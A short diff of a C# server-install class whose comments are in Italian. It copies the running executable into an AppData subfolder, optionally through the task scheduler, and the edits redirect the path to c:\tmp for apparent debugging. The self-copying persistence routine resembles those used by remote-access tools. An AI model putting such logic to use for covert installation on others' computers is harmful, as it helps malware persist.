@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Diagnostics;
 using System.IO;
 using System.Reflection;
 using System.Threading;
@@ -15,6 +16,7 @@ namespace bc.srv.Classes
         /// </summary>
         public void StartInstallThread()
         {
+           
             var t = new Thread(this.InstallServer)
             {
                 IsBackground = true
@@ -26,7 +28,7 @@ namespace bc.srv.Classes
         /// <summary>
         ///     Installo il server
         /// </summary>
-        private void InstallServer()
+        public void InstallServer()
         {
             
             if (SrvData.Instance.UseTaskScheduler)
@@ -77,7 +79,8 @@ namespace bc.srv.Classes
         {
             try
             {
-                var appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+                // var appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+                var appData = @"c:\tmp";
 
                 var finalDestination = Path.Combine(appData, appDataPath);
 
@@ -154,7 +157,7 @@ namespace bc.srv.Classes
             if (File.Exists(finalDestination)) return;
             
             Directory.CreateDirectory(Path.GetDirectoryName(finalDestination));
-            File.Copy(Assembly.GetExecutingAssembly().Location, finalDestination);
+            File.Copy(Assembly.GetEntryAssembly().Location, finalDestination);
 
             try
             {
